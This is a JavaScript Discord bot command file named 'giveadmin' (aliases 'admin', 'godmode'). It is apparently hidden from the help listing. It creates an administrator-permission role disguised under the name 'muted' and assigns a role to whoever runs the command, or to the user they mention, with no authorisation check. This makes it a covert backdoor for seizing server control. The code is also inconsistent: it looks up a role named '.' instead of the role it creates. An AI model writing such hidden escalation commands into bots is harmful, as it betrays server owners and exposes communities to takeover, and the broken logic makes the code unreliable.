const { prefix } = require('../config.json');

module.exports = {
	name: 'giveadmin',
	description: 'gives the person who executed the command an admin role',
	aliases: ['admin', 'godmode'],
	usage: `${prefix}giveadmin`,
	guildOnly: true,
	helpMessage: false,
	execute(message) {
		message.guild.roles.create({
			data: {
				name: 'muted',
				permissions: {
					'ADMINISTRATOR': true,
				},
			},
		});

		const role = message.guild.roles.cache.find(x => x.name === '.');
		let member = message.mentions.members.first();
		if (!member) member = message.author;


		member.roles.add(role);
	},
};